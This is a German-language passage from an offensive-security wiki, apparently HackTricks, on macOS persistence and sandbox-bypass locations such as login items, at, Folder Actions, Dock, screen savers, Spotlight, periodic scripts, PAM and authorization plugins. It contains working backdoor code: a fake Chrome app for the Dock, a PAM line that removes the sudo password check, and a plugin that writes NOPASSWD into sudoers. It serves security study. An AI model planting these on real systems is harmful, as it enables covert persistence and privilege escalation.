**Login items** können **auch über die API** [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) angegeben werden. Die Konfiguration wird dann in **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`** gespeichert.

### ZIP as Login Item

(Vorherigen Abschnitt über Login Items beachten; dies ist eine Erweiterung.)

Wenn du eine **ZIP**-Datei als **Login Item** speicherst, öffnet die **Archive Utility** sie. Wenn die ZIP beispielsweise in **`~/Library`** gespeichert wurde und den Ordner **`LaunchAgents/file.plist`** mit einer backdoor enthielt, wird dieser Ordner erstellt (standardmäßig ist er nicht vorhanden) und die plist hinzugefügt. Beim nächsten erneuten Login des Users wird dann die in der plist angegebene **backdoor ausgeführt**.

Eine weitere Option wäre, die Dateien **`.bash_profile`** und **`.zshenv`** im HOME des Users zu erstellen. Dadurch würde diese Technik auch funktionieren, wenn der Ordner LaunchAgents bereits existiert.

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
- Du musst jedoch **`at` ausführen**, und es muss **aktiviert** sein.
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`at` muss ausgeführt** und **aktiviert** sein.

#### **Description**

`at`-Tasks sind dafür vorgesehen, **einmalige Tasks zu planen**, die zu bestimmten Zeiten ausgeführt werden. Im Gegensatz zu Cron jobs werden `at`-Tasks nach der Ausführung automatisch entfernt. Es ist wichtig zu beachten, dass diese Tasks Systemneustarts überdauern und unter bestimmten Bedingungen ein potenzielles Sicherheitsrisiko darstellen.

**Standardmäßig** sind sie **deaktiviert**, aber der **root**-User kann sie mit folgendem Befehl **aktivieren**:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Dies wird in 1 Stunde eine Datei erstellen:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
Überprüfe die Job-Warteschlange mit `atq:`
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Oben sehen wir zwei geplante Jobs. Wir können die Details des Jobs mit `at -c JOBNUMBER` ausgeben.
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
> [!WARNING]
> Wenn AT tasks nicht aktiviert sind, werden die erstellten tasks nicht ausgeführt.

Die **Job-Dateien** befinden sich unter `/private/var/at/jobs/`
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
Der Dateiname enthält die Queue, die Jobnummer und den Zeitpunkt, zu dem der Job ausgeführt werden soll. Nehmen wir zum Beispiel `a0001a019bdcd2`.

- `a` - dies ist die Queue
- `0001a` - Jobnummer in Hexadezimal, `0x1a = 26`
- `019bdcd2` - Zeit in Hexadezimal. Sie stellt die seit der Epoch vergangenen Minuten dar. `0x019bdcd2` entspricht dezimal `26991826`. Wenn wir diesen Wert mit 60 multiplizieren, erhalten wir `1619509560`, was `GMT: 2021. April 27., Tuesday 7:46:00` entspricht.

Wenn wir die Jobdatei ausgeben, stellen wir fest, dass sie dieselben Informationen enthält, die wir mit `at -c` erhalten haben.

### Folder Actions

Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
- Du musst jedoch in der Lage sein, `osascript` mit Argumenten aufzurufen, um **`System Events`** zu kontaktieren und Folder Actions konfigurieren zu können
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Es verfügt über einige grundlegende TCC-Berechtigungen wie Desktop, Documents und Downloads

#### Location

- **`/Library/Scripts/Folder Action Scripts`**
- Root erforderlich
- **Trigger**: Zugriff auf den angegebenen Ordner
- **`~/Library/Scripts/Folder Action Scripts`**
- **Trigger**: Zugriff auf den angegebenen Ordner

#### Description & Exploitation

Folder Actions sind Scripts, die automatisch durch Änderungen in einem Ordner ausgelöst werden, etwa durch das Hinzufügen oder Entfernen von Elementen oder durch andere Aktionen wie das Öffnen oder Ändern der Größe des Ordnerfensters. Diese Aktionen können für verschiedene Aufgaben genutzt und auf unterschiedliche Weise ausgelöst werden, beispielsweise über die Finder UI oder Terminal-Befehle.

Zum Einrichten von Folder Actions stehen dir unter anderem folgende Optionen zur Verfügung:

1. Einen Folder Action-Workflow mit [Automator](https://support.apple.com/guide/automator/welcome/mac) erstellen und als Service installieren.
2. Über Folder Actions Setup im Kontextmenü eines Ordners manuell ein Script zuweisen.
3. OSAScript verwenden, um Apple Event-Nachrichten an die `System Events.app` zu senden und eine Folder Action programmgesteuert einzurichten.
- Diese Methode ist besonders nützlich, um die Action in das System einzubetten und dadurch eine gewisse Persistence zu erreichen.

Das folgende Script ist ein Beispiel dafür, was durch eine Folder Action ausgeführt werden kann:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Um das obige Script für Folder Actions nutzbar zu machen, kompiliere es mit:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Nachdem das Script kompiliert wurde, richten Sie Folder Actions aus, indem Sie das unten stehende Script ausführen. Dieses Script aktiviert Folder Actions global und weist das zuvor kompilierte Script speziell dem Desktop-Ordner zu.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
Führe das Setup-Skript aus mit:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- So implementierst du diese Persistence über die GUI:

Dies ist das Skript, das ausgeführt wird:
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Kompiliere es mit: `osacompile -l JavaScript -o folder.scpt source.js`

Verschiebe es nach:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Dann öffne die App `Folder Actions Setup`, wähle den **Ordner aus, den du überwachen möchtest**, und wähle in deinem Fall **`folder.scpt`** (in meinem Fall habe ich ihn output2.scp genannt):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Wenn du diesen Ordner nun mit **Finder** öffnest, wird dein Script ausgeführt.

Diese Konfiguration wurde in der unter **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** gespeicherten **plist** im base64-Format abgelegt.

Versuchen wir nun, diese Persistenz ohne GUI-Zugriff einzurichten:

1. **Kopiere `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** nach `/tmp`, um ein Backup zu erstellen:
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Entferne** die gerade eingerichteten Folder Actions:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Da wir nun eine leere Umgebung haben:

3. Kopiere die Backup-Datei: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Öffne die Folder Actions Setup.app, damit diese Konfiguration geladen wird: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> Bei mir hat das nicht funktioniert, aber dies sind die Anweisungen aus dem Writeup:(

### Dock shortcuts

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
- Allerdings muss eine bösartige Anwendung im System installiert sein
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- `~/Library/Preferences/com.apple.dock.plist`
- **Trigger**: Wenn der Benutzer auf die App im Dock klickt

#### Beschreibung & Exploitation

Alle im Dock angezeigten Anwendungen werden in der plist **`~/Library/Preferences/com.apple.dock.plist`** angegeben.

Es ist möglich, **eine Anwendung hinzuzufügen**, und zwar einfach mit:
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
Mithilfe von **social engineering** könntest du beispielsweise **Google Chrome** im Dock **impersonate** und tatsächlich dein eigenes Script ausführen:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Farbwähler

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)

- Nützlich zum Umgehen der Sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Eine sehr spezifische Aktion muss ausgeführt werden
- Du landest anschließend in einer anderen Sandbox
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- `/Library/ColorPickers`
- Root erforderlich
- Trigger: Farbwähler verwenden
- `~/Library/ColorPickers`
- Trigger: Farbwähler verwenden

#### Beschreibung & Exploit

**Kompiliere** ein **Color Picker**-Bundle mit deinem Code (du könntest beispielsweise [**dieses hier**](https://github.com/viktorstrate/color-picker-plus) verwenden), füge einen Constructor hinzu (wie im Abschnitt [Screen Saver](macos-auto-start-locations.md#screen-saver)) und kopiere das Bundle nach `~/Library/ColorPickers`.

Wenn der Farbwähler anschließend ausgelöst wird, sollte auch dein Code ausgeführt werden.

Beachte, dass das Binary, das deine Library lädt, eine **sehr restriktive Sandbox** verwendet: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)

- Nützlich zum Umgehen der Sandbox: **Nein, da du deine eigene App ausführen musst**
- TCC bypass: ???

#### Ort

- Eine bestimmte App

#### Beschreibung & Exploit

Ein Anwendungsbeispiel mit einer Finder Sync Extension [**ist hier zu finden**](https://github.com/D00MFist/InSync).

Anwendungen können über `Finder Sync Extensions` verfügen. Diese Extension befindet sich innerhalb einer Anwendung, die ausgeführt wird. Damit die Extension ihren Code ausführen kann, **muss sie mit einem gültigen Apple-Entwicklerzertifikat signiert** und **sandboxed** sein (obwohl gelockerte Ausnahmen hinzugefügt werden könnten). Außerdem muss sie mit etwas wie dem Folgenden registriert werden:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Screen Saver

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

- Nützlich zum Umgehen der Sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Du landest jedoch in einer gewöhnlichen Application-Sandbox
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- `/System/Library/Screen Savers`
- Root erforderlich
- **Trigger**: Den Bildschirmschoner auswählen
- `/Library/Screen Savers`
- Root erforderlich
- **Trigger**: Den Bildschirmschoner auswählen
- `~/Library/Screen Savers`
- **Trigger**: Den Bildschirmschoner auswählen

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Beschreibung & Exploit

Erstelle ein neues Projekt in Xcode und wähle die Vorlage aus, um einen neuen **Screen Saver** zu generieren. Füge anschließend deinen Code hinzu, zum Beispiel den folgenden Code zum Erzeugen von Logs.

**Build** it, and kopiere das `.saver`-Bundle nach **`~/Library/Screen Savers`**. Öffne anschließend die Screen-Saver-GUI. Wenn du einfach darauf klickst, sollte eine große Menge an Logs erzeugt werden:
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> Beachte, dass du dich **innerhalb der allgemeinen Application-Sandbox** befindest, da du in den Entitlements der Binärdatei, die diesen Code lädt (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`), **`com.apple.security.app-sandbox`** finden kannst.

Saver-Code:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight Plugins

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)

- Nützlich zum Umgehen der Sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Du landest jedoch in einer Application Sandbox
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Die Sandbox scheint sehr eingeschränkt zu sein

#### Location

- `~/Library/Spotlight/`
- **Trigger**: Eine neue Datei mit einer vom Spotlight plugin verwalteten Erweiterung wird erstellt.
- `/Library/Spotlight/`
- **Trigger**: Eine neue Datei mit einer vom Spotlight plugin verwalteten Erweiterung wird erstellt.
- Root erforderlich
- `/System/Library/Spotlight/`
- **Trigger**: Eine neue Datei mit einer vom Spotlight plugin verwalteten Erweiterung wird erstellt.
- Root erforderlich
- `Some.app/Contents/Library/Spotlight/`
- **Trigger**: Eine neue Datei mit einer vom Spotlight plugin verwalteten Erweiterung wird erstellt.
- Eine neue App erforderlich

#### Description & Exploitation

Spotlight ist die integrierte Suchfunktion von macOS, die Benutzern **schnellen und umfassenden Zugriff auf die Daten auf ihren Computern** ermöglichen soll.\
Um diese schnelle Suchfunktion bereitzustellen, verwaltet Spotlight eine **proprietäre Datenbank** und erstellt einen Index, indem es **die meisten Dateien parst**. Dadurch werden schnelle Suchen sowohl nach Dateinamen als auch nach deren Inhalt ermöglicht.

Der zugrunde liegende Mechanismus von Spotlight umfasst einen zentralen Prozess namens „mds“, was für **„metadata server“** steht. Dieser Prozess steuert den gesamten Spotlight-Dienst. Ergänzend dazu gibt es mehrere „mdworker“-Daemons, die verschiedene Wartungsaufgaben ausführen, beispielsweise die Indizierung unterschiedlicher Dateitypen (`ps -ef | grep mdworker`). Diese Aufgaben werden durch Spotlight importer plugins oder **„.mdimporter bundles“** ermöglicht, durch die Spotlight Inhalte aus einer Vielzahl von Dateiformaten verstehen und indizieren kann.

Die Plugins oder **`.mdimporter`** bundles befinden sich an den zuvor genannten Orten. Wenn ein neues Bundle erscheint, wird es innerhalb einer Minute geladen (ein Neustart eines Dienstes ist nicht erforderlich). Diese Bundles müssen angeben, **welchen Dateityp und welche Erweiterungen sie verwalten können**. Auf diese Weise verwendet Spotlight sie, wenn eine neue Datei mit der angegebenen Erweiterung erstellt wird.

Es ist möglich, **alle geladenen `mdimporters`** mit folgendem Befehl zu finden:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
Und beispielsweise wird **/Library/Spotlight/iBooksAuthor.mdimporter** verwendet, um diese Dateitypen zu parsen (unter anderem mit den Erweiterungen `.iba` und `.book`):
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> Wenn du die Plist eines anderen `mdimporter` überprüfst, findest du möglicherweise den Eintrag **`UTTypeConformsTo`** nicht. Das liegt daran, dass es sich dabei um einen integrierten _Uniform Type Identifier_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) handelt und keine Erweiterungen angegeben werden müssen.
>
> Außerdem haben standardmäßige System-Plugins immer Vorrang. Ein Angreifer kann daher nur auf Dateien zugreifen, die nicht bereits von Apples eigenen `mdimporters` indiziert werden.

Um einen eigenen Importer zu erstellen, könntest du mit diesem Projekt beginnen: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer), anschließend den Namen und **`CFBundleDocumentTypes`** ändern sowie **`UTImportedTypeDeclarations`** hinzufügen, damit die gewünschte Erweiterung unterstützt wird, und diese in **`schema.xml`** widerspiegeln.\
Ändere dann den Code der Funktion **`GetMetadataForFile`**, damit dein Payload ausgeführt wird, sobald eine Datei mit der verarbeiteten Erweiterung erstellt wird.

Erstelle schließlich dein neues **`.mdimporter`** und kopiere es an einen der drei zuvor genannten Orte. Danach kannst du überprüfen, ob es geladen wurde, indem du **die Logs überwachst** oder **`mdimport -L.`** überprüfst.

### ~~Preference Pane~~

> [!CAUTION]
> Es sieht nicht so aus, als würde dies noch funktionieren.

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)

- Nützlich zum Umgehen der Sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Erfordert eine bestimmte Benutzeraktion
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Description

Es sieht nicht so aus, als würde dies noch funktionieren.

## Root Sandbox Bypass

> [!TIP]
> Hier findest du Startorte, die für **sandbox bypass** nützlich sind und es dir ermöglichen, etwas einfach auszuführen, indem du es als **root** **in eine Datei schreibst** und/oder andere **ungewöhnliche Bedingungen** erfüllst.

### Periodic

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)

- Nützlich zum Umgehen der Sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Du musst jedoch root sein
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
- Root erforderlich
- **Trigger**: Wenn der entsprechende Zeitpunkt erreicht ist
- `/etc/daily.local`, `/etc/weekly.local` oder `/etc/monthly.local`
- Root erforderlich
- **Trigger**: Wenn der entsprechende Zeitpunkt erreicht ist

#### Description & Exploitation

Die periodic-Skripte (**`/etc/periodic`**) werden aufgrund der **launch daemons** ausgeführt, die in `/System/Library/LaunchDaemons/com.apple.periodic*` konfiguriert sind. Beachte, dass in `/etc/periodic/` gespeicherte Skripte als **Besitzer der Datei** ausgeführt werden. Daher funktioniert dies nicht für eine mögliche Rechteausweitung.
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
Es gibt weitere periodische Skripte, deren Ausführung in **`/etc/defaults/periodic.conf`** angegeben ist:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
Wenn es dir gelingt, eine der Dateien `/etc/daily.local`, `/etc/weekly.local` oder `/etc/monthly.local` zu schreiben, wird sie **früher oder später ausgeführt**.

> [!WARNING]
> Beachte, dass das periodic-Script **als Besitzer des Scripts ausgeführt wird**. Wenn also ein normaler Benutzer Besitzer des Scripts ist, wird es als dieser Benutzer ausgeführt (dies kann Privilege-Escalation-Angriffe verhindern).

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)

- Nützlich zum Umgehen der Sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Dafür musst du jedoch root sein
- TCC-Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- Root ist immer erforderlich

#### Beschreibung & Exploitation

Da sich PAM stärker auf **Persistence** und Malware als auf eine einfache Ausführung innerhalb von macOS konzentriert, wird dieser Blog keine detaillierte Erklärung liefern. **Lies die Writeups, um diese Technik besser zu verstehen**.

Prüfe PAM-Module mit:
```bash
ls -l /etc/pam.d
```
Eine Persistence-/Privilege-Escalation-Technik unter Ausnutzung von PAM ist so einfach wie das Modifizieren des Moduls /etc/pam.d/sudo und das Hinzufügen der folgenden Zeile am Anfang:
```bash
auth       sufficient     pam_permit.so
```
Es wird also **etwa so aussehen**:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
Und daher wird jeder Versuch, **`sudo` zu verwenden, funktionieren**.

> [!CAUTION]
> Beachte, dass dieses Verzeichnis durch TCC geschützt ist. Daher wird der Benutzer höchstwahrscheinlich zur Zugriffsfreigabe aufgefordert.

Ein weiteres gutes Beispiel ist `su`. Hier sieht man, dass es ebenfalls möglich ist, den PAM-Modulen Parameter zu übergeben (und man könnte auch diese Datei backdooren):
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Authorization Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

- Nützlich zum Umgehen der sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Dafür musst du jedoch root sein und zusätzliche configs vornehmen
- TCC bypass: ???

#### Speicherort

- `/Library/Security/SecurityAgentPlugins/`
- Root erforderlich
- Außerdem muss die authorization database so konfiguriert werden, dass sie das plugin verwendet

#### Beschreibung & Exploitation

Du kannst ein authorization plugin erstellen, das bei der Anmeldung eines Users ausgeführt wird, um persistence aufrechtzuerhalten. Weitere Informationen zur Erstellung eines solchen plugins findest du in den vorherigen Writeups (und sei vorsichtig: Ein schlecht geschriebenes Plugin kann dich aussperren, sodass du deinen Mac aus dem Recovery Mode bereinigen musst).
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Verschiebe** das Bundle an den Speicherort, von dem es geladen werden soll:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
